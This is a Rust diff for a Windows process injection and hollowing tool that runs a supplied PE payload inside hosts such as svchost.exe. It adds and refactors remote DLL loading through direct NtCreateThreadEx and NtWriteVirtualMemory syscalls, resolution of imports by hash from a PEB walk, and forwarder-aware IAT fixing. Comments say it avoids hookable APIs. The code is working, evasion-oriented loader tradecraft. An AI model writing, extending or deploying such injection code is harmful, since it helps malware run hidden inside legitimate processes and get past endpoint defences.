@@ -779,6 +779,464 @@ unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut st
     (base + func_rva) as *mut std::ffi::c_void
 }
 
+/// Normalize a DLL name for cache keys and hash lookups.
+///
+/// Produces lowercase names and ensures a `.dll` suffix is present.
+#[cfg(windows)]
+fn normalize_dll_name(name: &str) -> String {
+    let lower = name.to_ascii_lowercase();
+    if lower.ends_with(".dll") {
+        lower
+    } else {
+        format!("{}.dll", lower)
+    }
+}
+
+/// Ensure a module is loaded locally and cache its base by normalized name.
+#[cfg(windows)]
+unsafe fn ensure_local_module_loaded_cached(
+    local_modules: &mut std::collections::HashMap<String, usize>,
+    dll_name: &str,
+) -> Option<usize> {
+    let key = normalize_dll_name(dll_name);
+    if let Some(&base) = local_modules.get(&key) {
+        return Some(base);
+    }
+
+    let mut key_nul = key.as_bytes().to_vec();
+    key_nul.push(0);
+    let hash = pe_resolve::hash_str(&key_nul);
+    let base = pe_resolve::get_module_handle_by_hash(hash).or_else(|| {
+        let h = ldr_load_local(&key);
+        if h == 0 {
+            None
+        } else {
+            Some(h)
+        }
+    })?;
+
+    local_modules.insert(key, base);
+    Some(base)
+}
+
+#[cfg(windows)]
+const MAX_EXPORT_FORWARD_DEPTH: u32 = 8;
+
+#[cfg(windows)]
+unsafe fn local_resolve_export_target_from_rva(
+    module_name: &str,
+    module_base: usize,
+    func_rva: usize,
+    export_dir_rva: u32,
+    export_dir_size: usize,
+    local_modules: &mut std::collections::HashMap<String, usize>,
+    depth: u32,
+) -> Option<(String, usize, usize)> {
+    use std::ffi::CStr;
+
+    if depth >= MAX_EXPORT_FORWARD_DEPTH {
+        return None;
+    }
+    if func_rva == 0 {
+        return None;
+    }
+
+    // Forwarder: RVA points into the export directory and contains an
+    // ASCII "DLL.Func" or "DLL.#Ordinal" string.
+    let export_start = export_dir_rva as usize;
+    let export_end = export_start.saturating_add(export_dir_size);
+    if func_rva >= export_start && func_rva < export_end {
+        let forward_ptr = (module_base + func_rva) as *const i8;
+        let forward = CStr::from_ptr(forward_ptr).to_str().ok()?;
+
+        let dot = forward.find('.')?;
+        let dll_part = &forward[..dot];
+        let symbol_part = &forward[dot + 1..];
+
+        let forwarded_module = normalize_dll_name(dll_part);
+        let forwarded_base = ensure_local_module_loaded_cached(local_modules, &forwarded_module)?;
+
+        if let Some(ord_str) = symbol_part.strip_prefix('#') {
+            let ord = ord_str.parse::<u16>().ok()?;
+            return local_resolve_export_target_by_ordinal(
+                &forwarded_module,
+                forwarded_base,
+                ord as u32,
+                local_modules,
+                depth + 1,
+            );
+        }
+
+        let mut symbol_nul = symbol_part.as_bytes().to_vec();
+        symbol_nul.push(0);
+        let symbol_hash = pe_resolve::hash_str(&symbol_nul);
+        return local_resolve_export_target_by_hash(
+            &forwarded_module,
+            forwarded_base,
+            symbol_hash,
+            local_modules,
+            depth + 1,
+        );
+    }
+
+    Some((normalize_dll_name(module_name), module_base, func_rva))
+}
+
+/// Resolve an export by ordinal and return the owning module and export RVA.
+///
+/// The returned tuple is `(module_name, module_base, export_rva)` where
+/// `module_name` may differ from the input when a forwarder chain is followed.
+#[cfg(windows)]
+unsafe fn local_resolve_export_target_by_ordinal(
+    module_name: &str,
+    module_base: usize,
+    ordinal: u32,
+    local_modules: &mut std::collections::HashMap<String, usize>,
+    depth: u32,
+) -> Option<(String, usize, usize)> {
+    let (export_dir_rva, export_dir_size, ed) = local_get_export_directory(module_base)?;
+
+    let base_ordinal = (*ed).Base;
+    let num_funcs = (*ed).NumberOfFunctions;
+    if ordinal < base_ordinal {
+        return None;
+    }
+    let idx = (ordinal - base_ordinal) as usize;
+    if idx >= num_funcs as usize {
+        return None;
+    }
+
+    let funcs = (module_base + (*ed).AddressOfFunctions as usize) as *const u32;
+    let func_rva = *funcs.add(idx) as usize;
+
+    local_resolve_export_target_from_rva(
+        module_name,
+        module_base,
+        func_rva,
+        export_dir_rva,
+        export_dir_size,
+        local_modules,
+        depth,
+    )
+}
+
+/// Resolve an export by name hash and return the owning module and export RVA.
+///
+/// The returned tuple is `(module_name, module_base, export_rva)` where
+/// `module_name` may differ from the input when a forwarder chain is followed.
+#[cfg(windows)]
+unsafe fn local_resolve_export_target_by_hash(
+    module_name: &str,
+    module_base: usize,
+    target_hash: u32,
+    local_modules: &mut std::collections::HashMap<String, usize>,
+    depth: u32,
+) -> Option<(String, usize, usize)> {
+    use std::ffi::CStr;
+
+    let (export_dir_rva, export_dir_size, ed) = local_get_export_directory(module_base)?;
+    let num_names = (*ed).NumberOfNames as usize;
+    let names = (module_base + (*ed).AddressOfNames as usize) as *const u32;
+    let funcs = (module_base + (*ed).AddressOfFunctions as usize) as *const u32;
+    let ords = (module_base + (*ed).AddressOfNameOrdinals as usize) as *const u16;
+
+    for i in 0..num_names {
+        let name_ptr = (module_base + (*names.add(i)) as usize) as *const i8;
+        let name = CStr::from_ptr(name_ptr).to_bytes();
+        if pe_resolve::hash_str(name) != target_hash {
+            continue;
+        }
+
+        let ord = *ords.add(i) as usize;
+        if ord >= (*ed).NumberOfFunctions as usize {
+            continue;
+        }
+        let func_rva = *funcs.add(ord) as usize;
+        return local_resolve_export_target_from_rva(
+            module_name,
+            module_base,
+            func_rva,
+            export_dir_rva,
+            export_dir_size,
+            local_modules,
+            depth,
+        );
+    }
+
+    None
+}
+
+/// Ensure `dll_name` is loaded in the remote process and return its base.
+///
+/// Uses `LdrLoadDll` in a suspended remote thread with architecture-specific
+/// register setup to pass `(Path, Flags, ModuleFileName, ModuleHandle)`.
+#[cfg(windows)]
+unsafe fn ensure_remote_module_loaded(
+    hprocess: *mut c_void,
+    dll_name: &str,
+    ldr_load_dll_addr: Option<usize>,
+) -> Result<usize> {
+    use winapi::um::winnt::{CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+
+    let ldr_addr = ldr_load_dll_addr.ok_or_else(|| {
+        anyhow!(
+            "fix_iat_remote: NtCreateThreadEx or LdrLoadDll unavailable for deferred DLL load ({})",
+            dll_name
+        )
+    })?;
+
+    let wide_name: Vec<u16> = dll_name.encode_utf16().chain(std::iter::once(0)).collect();
+    let wide_bytes = wide_name.len() * 2;
+    let us_offset = wide_bytes;
+    let base_addr_offset = us_offset + std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>();
+    let total_remote = base_addr_offset + std::mem::size_of::<usize>();
+
+    let mut rb: *mut c_void = std::ptr::null_mut();
+    let mut rb_sz = total_remote;
+    let alloc_s = nt_syscall::syscall!(
+        "NtAllocateVirtualMemory",
+        hprocess as u64,
+        &mut rb as *mut _ as u64,
+        0u64,
+        &mut rb_sz as *mut _ as u64,
+        (MEM_COMMIT | MEM_RESERVE) as u64,
+        PAGE_READWRITE as u64,
+    )
+    .unwrap_or(-1);
+    if alloc_s < 0 || rb.is_null() {
+        return Err(anyhow!(
+            "fix_iat_remote: failed to allocate remote staging block for LdrLoadDll arguments"
+        ));
+    }
+
+    let remote_block = rb;
+    let cleanup_block = || {
+        let mut rb2 = remote_block;
+        let mut rb2_sz: usize = 0; // MEM_RELEASE ignores size
+        let _ = nt_syscall::syscall!(
+            "NtFreeVirtualMemory",
+            hprocess as u64,
+            &mut rb2 as *mut _ as u64,
+            &mut rb2_sz as *mut _ as u64,
+            NT_MEM_RELEASE as u64,
+        );
+    };
+
+    let mut wr = 0usize;
+    let ws = nt_syscall::syscall!(
+        "NtWriteVirtualMemory",
+        hprocess as u64,
+        remote_block as u64,
+        wide_name.as_ptr() as u64,
+        wide_bytes as u64,
+        &mut wr as *mut _ as u64,
+    )
+    .unwrap_or(-1);
+    if ws < 0 {
+        cleanup_block();
+        return Err(anyhow!(
+            "fix_iat_remote: failed to write remote DLL name buffer for LdrLoadDll"
+        ));
+    }
+
+    let remote_us_ptr = (remote_block as usize + us_offset) as *mut c_void;
+    let remote_base_out = (remote_block as usize + base_addr_offset) as *mut c_void;
+    let remote_str_va = remote_block as usize;
+
+    let mut remote_us = winapi::shared::ntdef::UNICODE_STRING {
+        Length: (wide_bytes.saturating_sub(2)) as u16,
+        MaximumLength: wide_bytes as u16,
+        Buffer: remote_str_va as *mut u16,
+    };
+
+    let us_ws = nt_syscall::syscall!(
+        "NtWriteVirtualMemory",
+        hprocess as u64,
+        remote_us_ptr as u64,
+        &mut remote_us as *mut _ as u64,
+        std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>() as u64,
+        &mut wr as *mut _ as u64,
+    )
+    .unwrap_or(-1);
+    if us_ws < 0 {
+        cleanup_block();
+        return Err(anyhow!(
+            "fix_iat_remote: failed to write remote UNICODE_STRING for LdrLoadDll"
+        ));
+    }
+
+    let zero_base: usize = 0;
+    let base_ws = nt_syscall::syscall!(
+        "NtWriteVirtualMemory",
+        hprocess as u64,
+        remote_base_out as u64,
+        &zero_base as *const _ as u64,
+        std::mem::size_of::<usize>() as u64,
+        &mut wr as *mut _ as u64,
+    )
+    .unwrap_or(-1);
+    if base_ws < 0 {
+        cleanup_block();
+        return Err(anyhow!(
+            "fix_iat_remote: failed to initialize remote output slot for LdrLoadDll"
+        ));
+    }
+
+    let mut h_thread: *mut c_void = std::ptr::null_mut();
+    let status = nt_syscall::syscall!(
+        "NtCreateThreadEx",
+        &mut h_thread as *mut _ as u64,
+        NT_THREAD_INJECT_ACCESS as u64,
+        0u64,
+        hprocess as u64,
+        ldr_addr as u64,
+        remote_us_ptr as u64,
+        NT_THREAD_SUSPENDED as u64,
+        0u64,
+        0u64,
+        0u64,
+        0u64,
+    )
+    .unwrap_or(-1);
+    if status < 0 || h_thread.is_null() {
+        cleanup_block();
+        return Err(anyhow!(
+            "fix_iat_remote: NtCreateThreadEx for remote LdrLoadDll failed: {:#010x}",
+            status as u32
+        ));
+    }
+
+    let mut ldr_args_configured = false;
+
+    #[cfg(target_arch = "x86_64")]
+    {
+        let mut ctx: CONTEXT = std::mem::zeroed();
+        ctx.ContextFlags = CONTEXT_FULL;
+        let get_ctx = nt_syscall::syscall!(
+            "NtGetContextThread",
+            h_thread as u64,
+            &mut ctx as *mut _ as u64,
+        )
+        .unwrap_or(-1);
+        if get_ctx < 0 {
+            pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
+            cleanup_block();
+            return Err(anyhow!(
+                "fix_iat_remote: NtGetContextThread failed while preparing remote LdrLoadDll"
+            ));
+        }
+
+        // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle)
+        ctx.Rcx = 0;
+        ctx.Rdx = 0;
+        ctx.R8 = remote_us_ptr as u64;
+        ctx.R9 = remote_base_out as u64;
+        let set_ctx = nt_syscall::syscall!(
+            "NtSetContextThread",
+            h_thread as u64,
+            &ctx as *const _ as u64,
+        )
+        .unwrap_or(-1);
+        if set_ctx >= 0 {
+            ldr_args_configured = true;
+        }
+    }
+
+    #[cfg(target_arch = "aarch64")]
+    {
+        let mut ctx: CONTEXT = std::mem::zeroed();
+        ctx.ContextFlags = CONTEXT_FULL;
+        let get_ctx = nt_syscall::syscall!(
+            "NtGetContextThread",
+            h_thread as u64,
+            &mut ctx as *mut _ as u64,
+        )
+        .unwrap_or(-1);
+        if get_ctx < 0 {
+            pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
+            cleanup_block();
+            return Err(anyhow!(
+                "fix_iat_remote: NtGetContextThread failed while preparing remote LdrLoadDll"
+            ));
+        }
+
+        // Windows ARM64 ABI: X0-X3 = first four integer/pointer arguments.
+        let regs = ctx.u.s_mut();
+        regs.X0 = 0;
+        regs.X1 = 0;
+        regs.X2 = remote_us_ptr as u64;
+        regs.X3 = remote_base_out as u64;
+        let set_ctx = nt_syscall::syscall!(
+            "NtSetContextThread",
+            h_thread as u64,
+            &ctx as *const _ as u64,
+        )
+        .unwrap_or(-1);
+        if set_ctx >= 0 {
+            ldr_args_configured = true;
+        }
+    }
+
+    if !ldr_args_configured {
+        let _ = nt_syscall::syscall!("NtTerminateThread", h_thread as u64, 0u64);
+        pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
+        cleanup_block();
+        return Err(anyhow!(
+            "fix_iat_remote: NtSetContextThread failed while preparing remote LdrLoadDll"
+        ));
+    }
+
+    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
+    let _ = nt_syscall::syscall!("NtWaitForSingleObject", h_thread as u64, 0u64, 0u64);
+
+    let mut loaded_remote_base: usize = 0;
+    let mut rd = 0usize;
+    let read_s = nt_syscall::syscall!(
+        "NtReadVirtualMemory",
+        hprocess as u64,
+        remote_base_out as u64,
+        &mut loaded_remote_base as *mut _ as u64,
+        std::mem::size_of::<usize>() as u64,
+        &mut rd as *mut _ as u64,
+    )
+    .unwrap_or(-1);
+
+    pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
+    cleanup_block();
+
+    if read_s < 0 || rd != std::mem::size_of::<usize>() {
+        return Err(anyhow!(
+            "fix_iat_remote: failed to read remote LdrLoadDll base output for {}",
+            dll_name
+        ));
+    }
+    if loaded_remote_base == 0 {
+        return Err(anyhow!(
+            "fix_iat_remote: remote LdrLoadDll reported null module base for {}",
+            dll_name
+        ));
+    }
+
+    Ok(loaded_remote_base)
+}
+
+#[cfg(windows)]
+unsafe fn ensure_remote_module_loaded_cached(
+    hprocess: *mut c_void,
+    dll_name: &str,
+    ldr_load_dll_addr: Option<usize>,
+    remote_modules: &mut std::collections::HashMap<String, usize>,
+) -> Result<usize> {
+    let key = normalize_dll_name(dll_name);
+    if let Some(&base) = remote_modules.get(&key) {
+        return Ok(base);
+    }
+
+    let base = ensure_remote_module_loaded(hprocess, &key, ldr_load_dll_addr)?;
+    remote_modules.insert(key, base);
+    Ok(base)
+}
+
 /// Hollow a new suspended process and execute the provided PE payload inside it.
 ///
 /// The host process is chosen from a prioritised candidate list (svchost.exe,
@@ -1860,6 +2318,7 @@ unsafe fn fix_iat_remote32(
         return Ok(());
     }
 
+    let mut unresolved_count: usize = 0;
     let mut desc_off = rva_to_file_offset32(import_dir.VirtualAddress as usize, nt);
     loop {
         if desc_off + 20 > payload.len() {
@@ -1940,6 +2399,7 @@ unsafe fn fix_iat_remote32(
                         ord,
                         dll_name_str
                     );
+                    unresolved_count += 1;
                     0
                 } else {
                     ep as usize
@@ -1971,6 +2431,7 @@ unsafe fn fix_iat_remote32(
                                 &name_null[..name_null.len().saturating_sub(1)]
                             )
                         );
+                        unresolved_count += 1;
                         0
                     }
                 }
@@ -2001,6 +2462,12 @@ unsafe fn fix_iat_remote32(
         desc_off += 20;
     }
 
+    if unresolved_count > 0 {
+        return Err(anyhow::anyhow!(
+            "fix_iat_remote32: {} import(s) could not be resolved — payload would crash at runtime",
+            unresolved_count
+        ));
+    }
     Ok(())
 }
 
@@ -2034,7 +2501,7 @@ unsafe fn apply_section_protections32(
         let mut addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
         let mut sz = virt_size;
         let mut old = 0u32;
-        let _ = nt_syscall::syscall!(
+        let status = nt_syscall::syscall!(
             "NtProtectVirtualMemory",
             hprocess as u64,
             &mut addr as *mut _ as u64,
@@ -2042,6 +2509,15 @@ unsafe fn apply_section_protections32(
             protect as u64,
             &mut old as *mut _ as u64,
         );
+        if status.as_ref().map_or(true, |s| *s < 0) {
+            tracing::warn!(
+                "apply_section_protections32: NtProtectVirtualMemory(section={:?}, base={:#x}, size={:#x}) failed: {:?}",
+                &sec.Name,
+                addr as usize,
+                virt_size,
+                status
+            );
+        }
     }
 }
 
@@ -2603,8 +3079,11 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
 }
 
 /// Resolve each imported function in the payload's IAT and write addresses into
-/// the remote process (2.2).  DLL addresses are resolved in the injector's own
-/// address space — valid because system DLLs share ASLR offsets session-wide.
+/// the remote process (2.2).
+///
+/// Import resolution is done module-relative (RVA) and then remapped onto the
+/// *remote* module base so correctness does not depend on local/remote module
+/// base equality.
 #[cfg(windows)]
 unsafe fn fix_iat_remote(
     hprocess: *mut c_void,
@@ -2613,7 +3092,7 @@ unsafe fn fix_iat_remote(
     payload: &[u8],
     written: &mut usize,
 ) -> Result<()> {
-    use winapi::um::winnt::{CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+    use std::collections::HashMap;
 
     // Resolve LdrLoadDll address for the remote-DLL-load path.
     let ntdll_base =
@@ -2630,9 +3109,13 @@ unsafe fn fix_iat_remote(
         return Ok(());
     }
 
+    let mut local_modules: HashMap<String, usize> = HashMap::new();
+    let mut remote_modules: HashMap<String, usize> = HashMap::new();
+
     // Convert import-directory RVA to file offset.  Each field in the import
     // descriptor (OriginalFirstThunk, Name, FirstThunk) is also an RVA and
     // must be converted before using it as a payload index.
+    let mut unresolved_count: usize = 0;
     let mut desc_off = rva_to_file_offset(import_dir.VirtualAddress as usize, nt);
     loop {
         if desc_off + 20 > payload.len() {
@@ -2674,307 +3157,24 @@ unsafe fn fix_iat_remote(
                 continue;
             }
         };
-        let dll_name_lower = format!("{}\0", dll_name_str.to_ascii_lowercase());
+        let dll_name_norm = normalize_dll_name(dll_name_str);
 
-        // Find/load the DLL in our process
-        let hash = pe_resolve::hash_str(dll_name_lower.as_bytes());
-        let local_existing = pe_resolve::get_module_handle_by_hash(hash);
-        let dll_base = if let Some(b) = local_existing {
-            b
-        } else {
-            // DLL was not already in our address space.  Load it into the
-            // *target* process first so that:
-            //   L-02: DLL_PROCESS_ATTACH fires in the target
-            //   L-01: session-wide ASLR ensures both processes map the DLL at
-            //         the same preferred base, so addresses we resolve locally
-            //         remain valid remotely.
-            if let Some(ldr_addr) = ldr_load_dll_addr {
-                let wide_name: Vec<u16> = dll_name_str
-                    .encode_utf16()
-                    .chain(std::iter::once(0))
-                    .collect();
-                let wide_bytes = wide_name.len() * 2;
-                let us_offset = wide_bytes;
-                let base_addr_offset =
-                    us_offset + std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>();
-                let total_remote = base_addr_offset + std::mem::size_of::<usize>();
-
-                let mut rb: *mut c_void = std::ptr::null_mut();
-                let mut rb_sz = total_remote;
-                let alloc_s = nt_syscall::syscall!(
-                    "NtAllocateVirtualMemory",
-                    hprocess as u64,
-                    &mut rb as *mut _ as u64,
-                    0u64,
-                    &mut rb_sz as *mut _ as u64,
-                    (MEM_COMMIT | MEM_RESERVE) as u64,
-                    PAGE_READWRITE as u64,
+        let dll_base = ensure_local_module_loaded_cached(&mut local_modules, &dll_name_norm)
+            .ok_or_else(|| {
+                anyhow!(
+                    "fix_iat_remote: could not find/load local dependency {}",
+                    dll_name_norm
                 )
-                .unwrap_or(-1);
-                let remote_block = if alloc_s >= 0 {
-                    rb
-                } else {
-                    std::ptr::null_mut()
-                };
-                if !remote_block.is_null() {
-                    let mut remote_load_failure: Option<String> = None;
+            })?;
 
-                    let mut wr = 0usize;
-                    let ws = nt_syscall::syscall!(
-                        "NtWriteVirtualMemory",
-                        hprocess as u64,
-                        remote_block as u64,
-                        wide_name.as_ptr() as u64,
-                        wide_bytes as u64,
-                        &mut wr as *mut _ as u64,
-                    )
-                    .unwrap_or(-1);
-                    if ws >= 0 {
-                        let remote_us_ptr = (remote_block as usize + us_offset) as *mut c_void;
-                        let remote_base_out =
-                            (remote_block as usize + base_addr_offset) as *mut c_void;
-                        let remote_str_va = remote_block as usize;
-
-                        let mut remote_us = winapi::shared::ntdef::UNICODE_STRING {
-                            Length: (wide_bytes.saturating_sub(2)) as u16,
-                            MaximumLength: wide_bytes as u16,
-                            Buffer: remote_str_va as *mut u16,
-                        };
-
-                        let us_ws = nt_syscall::syscall!(
-                            "NtWriteVirtualMemory",
-                            hprocess as u64,
-                            remote_us_ptr as u64,
-                            &mut remote_us as *mut _ as u64,
-                            std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>() as u64,
-                            &mut wr as *mut _ as u64,
-                        )
-                        .unwrap_or(-1);
-                        if us_ws >= 0 {
-                            let zero_base: usize = 0;
-                            let base_ws = nt_syscall::syscall!(
-                                "NtWriteVirtualMemory",
-                                hprocess as u64,
-                                remote_base_out as u64,
-                                &zero_base as *const _ as u64,
-                                std::mem::size_of::<usize>() as u64,
-                                &mut wr as *mut _ as u64,
-                            )
-                            .unwrap_or(-1);
-                            if base_ws >= 0 {
-                                let mut h_thread: *mut c_void = std::ptr::null_mut();
-                                let status = nt_syscall::syscall!(
-                                    "NtCreateThreadEx",
-                                    &mut h_thread as *mut _ as u64,
-                                    NT_THREAD_INJECT_ACCESS as u64,
-                                    0u64,
-                                    hprocess as u64,
-                                    ldr_addr as u64,
-                                    remote_us_ptr as u64,
-                                    NT_THREAD_SUSPENDED as u64,
-                                    0u64,
-                                    0u64,
-                                    0u64,
-                                    0u64,
-                                )
-                                .unwrap_or(-1);
-                                if status >= 0 && !h_thread.is_null() {
-                                    let mut ldr_args_configured = false;
-
-                                    #[cfg(target_arch = "x86_64")]
-                                    {
-                                        let mut ctx: CONTEXT = std::mem::zeroed();
-                                        ctx.ContextFlags = CONTEXT_FULL;
-                                        let get_ctx = nt_syscall::syscall!(
-                                            "NtGetContextThread",
-                                            h_thread as u64,
-                                            &mut ctx as *mut _ as u64,
-                                        )
-                                        .unwrap_or(-1);
-                                        if get_ctx < 0 {
-                                            tracing::warn!(
-                                                "fix_iat_remote: NtGetContextThread before LdrLoadDll failed"
-                                            );
-                                            remote_load_failure = Some(
-                                                "NtGetContextThread failed while preparing remote LdrLoadDll".to_string(),
-                                            );
-                                        } else {
-                                            // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle)
-                                            ctx.Rcx = 0;
-                                            ctx.Rdx = 0;
-                                            ctx.R8 = remote_us_ptr as u64;
-                                            ctx.R9 = remote_base_out as u64;
-                                            let set_ctx = nt_syscall::syscall!(
-                                                "NtSetContextThread",
-                                                h_thread as u64,
-                                                &ctx as *const _ as u64,
-                                            )
-                                            .unwrap_or(-1);
-                                            if set_ctx < 0 {
-                                                tracing::warn!(
-                                                    "fix_iat_remote: NtSetContextThread for LdrLoadDll failed"
-                                                );
-                                                remote_load_failure = Some(
-                                                    "NtSetContextThread failed while preparing remote LdrLoadDll".to_string(),
-                                                );
-                                            } else {
-                                                ldr_args_configured = true;
-                                            }
-                                        }
-                                    }
-
-                                    #[cfg(target_arch = "aarch64")]
-                                    {
-                                        let mut ctx: CONTEXT = std::mem::zeroed();
-                                        ctx.ContextFlags = CONTEXT_FULL;
-                                        let get_ctx = nt_syscall::syscall!(
-                                            "NtGetContextThread",
-                                            h_thread as u64,
-                                            &mut ctx as *mut _ as u64,
-                                        )
-                                        .unwrap_or(-1);
-                                        if get_ctx < 0 {
-                                            tracing::warn!(
-                                                "fix_iat_remote: NtGetContextThread before LdrLoadDll failed"
-                                            );
-                                            remote_load_failure = Some(
-                                                "NtGetContextThread failed while preparing remote LdrLoadDll".to_string(),
-                                            );
-                                        } else {
-                                            // Windows ARM64 calling convention passes the first
-                                            // four integer/pointer arguments in X0-X3:
-                                            // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle).
-                                            let regs = ctx.u.s_mut();
-                                            regs.X0 = 0;
-                                            regs.X1 = 0;
-                                            regs.X2 = remote_us_ptr as u64;
-                                            regs.X3 = remote_base_out as u64;
-                                            let set_ctx = nt_syscall::syscall!(
-                                                "NtSetContextThread",
-                                                h_thread as u64,
-                                                &ctx as *const _ as u64,
-                                            )
-                                            .unwrap_or(-1);
-                                            if set_ctx < 0 {
-                                                tracing::warn!(
-                                                    "fix_iat_remote: NtSetContextThread for LdrLoadDll failed"
-                                                );
-                                                remote_load_failure = Some(
-                                                    "NtSetContextThread failed while preparing remote LdrLoadDll".to_string(),
-                                                );
-                                            } else {
-                                                ldr_args_configured = true;
-                                            }
-                                        }
-                                    }
-
-                                    if !ldr_args_configured {
-                                        let _ = nt_syscall::syscall!(
-                                            "NtTerminateThread",
-                                            h_thread as u64,
-                                            0u64,
-                                        );
-                                        pe_resolve::close_handle(
-                                            h_thread as *mut core::ffi::c_void,
-                                        );
-                                    } else {
-                                        let _ = nt_syscall::syscall!(
-                                            "NtResumeThread",
-                                            h_thread as u64,
-                                            0u64,
-                                        );
-                                        // Wait with no timeout (null = infinite).
-                                        let _ = nt_syscall::syscall!(
-                                            "NtWaitForSingleObject",
-                                            h_thread as u64,
-                                            0u64,
-                                            0u64,
-                                        );
-
-                                        let mut loaded_remote_base: usize = 0;
-                                        let mut rd = 0usize;
-                                        let read_s = nt_syscall::syscall!(
-                                            "NtReadVirtualMemory",
-                                            hprocess as u64,
-                                            remote_base_out as u64,
-                                            &mut loaded_remote_base as *mut _ as u64,
-                                            std::mem::size_of::<usize>() as u64,
-                                            &mut rd as *mut _ as u64,
-                                        )
-                                        .unwrap_or(-1);
-                                        if read_s < 0 || rd != std::mem::size_of::<usize>() {
-                                            remote_load_failure = Some(format!(
-                                                "failed to read remote LdrLoadDll base output for {}",
-                                                dll_name_str
-                                            ));
-                                        } else if loaded_remote_base == 0 {
-                                            remote_load_failure = Some(format!(
-                                                "remote LdrLoadDll reported null module base for {}",
-                                                dll_name_str
-                                            ));
-                                        }
-
-                                        pe_resolve::close_handle(
-                                            h_thread as *mut core::ffi::c_void,
-                                        );
-                                    }
-                                } else {
-                                    remote_load_failure = Some(format!(
-                                        "NtCreateThreadEx for remote LdrLoadDll failed: {:#010x}",
-                                        status as u32
-                                    ));
-                                }
-                            } else {
-                                remote_load_failure = Some(
-                                    "failed to initialize remote output slot for LdrLoadDll"
-                                        .to_string(),
-                                );
-                            }
-                        } else {
-                            remote_load_failure = Some(
-                                "failed to write remote UNICODE_STRING for LdrLoadDll".to_string(),
-                            );
-                        }
-                    } else {
-                        remote_load_failure = Some(
-                            "failed to write remote DLL name buffer for LdrLoadDll".to_string(),
-                        );
-                    }
-                    let mut rb2 = remote_block;
-                    let mut rb2_sz: usize = 0; // MEM_RELEASE ignores size
-                    let _ = nt_syscall::syscall!(
-                        "NtFreeVirtualMemory",
-                        hprocess as u64,
-                        &mut rb2 as *mut _ as u64,
-                        &mut rb2_sz as *mut _ as u64,
-                        NT_MEM_RELEASE as u64,
-                    );
-
-                    if let Some(msg) = remote_load_failure {
-                        return Err(anyhow!("fix_iat_remote: {}", msg));
-                    }
-                } else {
-                    return Err(anyhow!(
-                        "fix_iat_remote: failed to allocate remote staging block for LdrLoadDll arguments"
-                    ));
-                }
-            } else {
-                return Err(anyhow!(
-                    "fix_iat_remote: NtCreateThreadEx or LdrLoadDll unavailable for deferred DLL load ({})",
-                    dll_name_str
-                ));
-            }
-            // Now load locally — use LdrLoadDll resolved via PEB walk (M-26)
-            // instead of the hookable LoadLibraryA IAT entry.
-            let hmod = ldr_load_local(dll_name_str);
-            hmod
-        };
-
-        if dll_base == 0 {
-            tracing::warn!("fix_iat_remote: could not find/load {}", dll_name_str);
-            desc_off += 20;
-            continue;
-        }
+        // Ensure the dependency is present in the target process and cache its
+        // actual remote base.  IAT entries are written relative to this base.
+        let _remote_dll_base = ensure_remote_module_loaded_cached(
+            hprocess,
+            &dll_name_norm,
+            ldr_load_dll_addr,
+            &mut remote_modules,
+        )?;
 
         let mut thunk_off = thunk_rva_off; // file offset into INT (import name table)
                                            // Track the IAT position as an RVA, not a file offset.  The remote process
@@ -2994,19 +3194,24 @@ unsafe fn fix_iat_remote(
                 break;
             }
 
-            let func_addr: usize = if thunk_val & (1u64 << 63) != 0 {
-                // Ordinal import: M-26 — resolve via clean export-table walk.
+            let resolved = if thunk_val & (1u64 << 63) != 0 {
+                // Ordinal import: resolve to owning module + export RVA.
                 let ord = (thunk_val & 0xFFFF) as u32;
-                let ep = local_get_export_addr_by_ordinal(dll_base, ord);
-                if ep.is_null() {
+                let r = local_resolve_export_target_by_ordinal(
+                    &dll_name_norm,
+                    dll_base,
+                    ord,
+                    &mut local_modules,
+                    0,
+                );
+                if r.is_none() {
                     tracing::warn!(
-                        "fix_iat_remote: ordinal {} in {} unresolved (refusing GetProcAddress fallback)",
-                        ord, dll_name_str
+                        "fix_iat_remote: ordinal {} in {} unresolved",
+                        ord,
+                        dll_name_norm
                     );
-                    0
-                } else {
-                    ep as usize
                 }
+                r
             } else {
                 // Named import: thunk_val is an RVA to IMAGE_IMPORT_BY_NAME
                 let ibn_rva = (thunk_val & 0x7FFF_FFFF) as usize;
@@ -3025,19 +3230,50 @@ unsafe fn fix_iat_remote(
                 let mut name_null = name_bytes[..nlen].to_vec();
                 name_null.push(0);
                 let hash = pe_resolve::hash_str(&name_null);
-                match pe_resolve::get_proc_address_by_hash(dll_base, hash) {
-                    Some(addr) => addr,
+                let r = local_resolve_export_target_by_hash(
+                    &dll_name_norm,
+                    dll_base,
+                    hash,
+                    &mut local_modules,
+                    0,
+                );
+                if r.is_none() {
+                    tracing::warn!(
+                        "fix_iat_remote: {}!{} unresolved via export walk",
+                        dll_name_norm,
+                        String::from_utf8_lossy(
+                            &name_null[..name_null.len().saturating_sub(1)]
+                        )
+                    );
+                }
+                r
+            };
+
+            let func_addr: usize = if let Some((owner_module, _owner_local_base, func_rva)) = resolved
+            {
+                let owner_remote_base = ensure_remote_module_loaded_cached(
+                    hprocess,
+                    &owner_module,
+                    ldr_load_dll_addr,
+                    &mut remote_modules,
+                )?;
+
+                match owner_remote_base.checked_add(func_rva) {
+                    Some(v) => v,
                     None => {
                         tracing::warn!(
-                            "fix_iat_remote: {}!{} unresolved via PEB walk, leaving IAT slot empty (M-26)",
-                            dll_name_str,
-                            String::from_utf8_lossy(
-                                &name_null[..name_null.len().saturating_sub(1)]
-                            )
+                            "fix_iat_remote: address overflow for {} (base={:#x}, rva={:#x})",
+                            owner_module,
+                            owner_remote_base,
+                            func_rva
                         );
+                        unresolved_count += 1;
                         0
                     }
                 }
+            } else {
